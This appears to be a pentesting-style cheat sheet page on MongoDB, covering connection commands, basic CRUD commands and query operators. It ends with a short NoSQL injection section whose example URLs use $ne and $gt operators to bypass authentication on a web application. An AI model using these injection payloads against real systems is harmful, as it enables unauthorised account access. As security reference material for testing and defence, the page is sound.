---
title: MongoDB
desc: A source-available cross-platform document-oriented database program.
tags: [Database, Linux, Web]
alts: []
website:
render_with_liquid: false
---

## Connect (local)

```sh
# Basic (default port: 27017)
mongo

# Specify port
mongo --port 27117
```

<br />

## Connect (remote)

```sh
mongo --host 10.0.0.1 --port 27017 -u username -p password
mongo "mongodb://10.0.0.1:27017"
mongo "mongodb://username:password@10.0.0.1:27017/?authSource=admin"
```

<br />

## Basic Commands

```sh
# All databases
> show dbs
# Current database
> db
# Switch database if it exists, or create new if not exist
> use db_name
# Collections
> show collections
# Run javascript file
> load("example.js")

# List users in the current database
> show users
> db.admin.find()

# Create new collection in current database
> db.createCollection("users")

# Create
> db.<collection_name>.insert({id: "1", username: "admin"})
# Read
> db.<collection_name>.find()
> db.<collection_name>.findOne({"username":"michael"})
# Update
> db.<collection_name>.update({id: "1"}, {$set: {username: "king"}})
# Delete
> db.<collection_name>.remove({"name": "Micael"})
# Delete all documents
> db.<collection_name>.remove({})
```

<br />

## Operators

```sh
# $eq: equal
# ex. username is "admin"
db.<collection_name>.findOne({username: {"$eq": "admin"}})

# $ne: not equal
# ex. password is not "xyz"
db.<collection_name>.findOne({id: "1"}, {password: {"$ne": "xyz"}})

# $gt: greater than
# ex. id is greater than 2
db.<collection_name>.findOne({id: {"$gt": "2"}})

# $where:

# $exists:

# $regex: 
```

<br />

## NoSQL Injection

If the web application uses MongDB, you might be able to fetch desired user information. It allows you to bypass authentication.

```sh
https://vulnerable.com/search?username=admin&password[$ne]=xyz
https://vulnerable.com/search?username[$ne]=admin&role=guest
https://vulnerable.com/search?id[$gt]=1&username=mike
```